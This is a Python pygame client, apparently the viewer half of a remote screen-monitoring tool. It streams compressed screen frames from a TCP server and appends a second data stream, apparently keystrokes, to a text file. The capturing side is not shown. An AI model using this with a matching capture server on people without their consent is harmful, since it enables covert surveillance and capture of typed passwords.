import socket
from zlib import decompress

import pygame

WIDTH = 1900
HEIGHT = 1000


def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf


def main(host='127.0.0.1', port=5001):
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    watching = True

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    try:
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break

            # Receive the size of the pixels length, the pixels length, and pixels
            perfix = sock.recv(1)
            size_len = int.from_bytes(sock.recv(1), byteorder='big')
            size = int.from_bytes(sock.recv(size_len), byteorder='big')
            if perfix == b"S":
                pixels = decompress(recvall(sock, size))

                # Create the Surface from raw pixels
                img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

                # Display the picture
                screen.blit(img, (0, 0))
                pygame.display.flip()
                clock.tick(60)
            elif perfix == b"K":
                data = recvall(sock, size)
                open_key_file(data)

    finally:
        sock.close()

def open_key_file(data):
    try:
        with open('output_file.txt', 'a') as output_file:
            decoded_data = [chr(item) if isinstance(item, int) else str(item) for item in data]
            #chr(item) if isinstance(item, int) else str(item): This is the conditional expression.
            # It checks if item is an integer (isinstance(item, int)). If it is, it converts the integer to its corresponding Unicode character using the chr function.
            # If item is not an integer, it converts it to a string using str(item).
            output_file.write(''.join(decoded_data) + '')
    except Exception as e:
        print(f"Error: {e}")





if __name__ == '__main__':
    main()
